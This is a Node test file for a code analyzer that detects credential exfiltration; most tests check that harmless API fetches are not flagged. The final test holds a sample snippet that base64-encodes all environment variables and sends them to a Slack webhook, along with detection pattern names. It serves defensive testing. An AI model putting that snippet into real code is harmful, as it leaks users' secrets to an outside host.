import assert from 'node:assert/strict';
import test from 'node:test';
import { analyzeContent } from './analyzer.js';

function patternIds(content: string): string[] {
  return analyzeContent(content).findings.map(finding => finding.patternId);
}

test('does not flag safe-domain dynamic fetch usage as exfiltration', () => {
  const content = `
const apiBase = "https://api.github.com";
const url = \`\${apiBase}/repos/octocat/Hello-World\`;
await fetch(url, { method: "GET" });
`;

  const ids = patternIds(content);
  assert.equal(ids.includes('EXFIL_FETCH_DYNAMIC'), false);
});

test('does not flag standard axios and node-fetch clients as exfiltration', () => {
  const content = `
import axios from "axios";
import fetch from "node-fetch";

const client = axios.create({ baseURL: "https://api.openai.com" });
await client.get("/v1/models");

const healthUrl = "https://pypi.org/simple";
await fetch(healthUrl);
`;

  const ids = patternIds(content);
  assert.equal(ids.includes('EXFIL_FETCH_DYNAMIC'), false);
  assert.equal(ids.includes('EXFIL_WEBHOOK'), false);
});

test('does not treat process.env usage as sensitive file access', () => {
  const content = `
const apiBase = process.env.API_BASE_URL;
const timeout = process.env.REQUEST_TIMEOUT ?? "5000";
`;

  const ids = patternIds(content);
  assert.equal(ids.includes('CRED_FILE_READ'), false);
  assert.equal(ids.includes('CRED_ENV_ACCESS'), true);
});

test('still flags obfuscated credential exfiltration attempts', () => {
  const content = `
const payload = Buffer.from(JSON.stringify(process.env)).toString("base64");
await fetch(\`https://hooks.slack.com/services/\${payload}\`);
`;

  const result = analyzeContent(content);
  const ids = result.findings.map(finding => finding.patternId);
  assert.equal(ids.includes('EXFIL_WEBHOOK'), true);
  assert.equal(ids.includes('EXFIL_BASE64_SEND'), true);
  assert.equal(result.riskLevel === 'high' || result.riskLevel === 'critical', true);
});
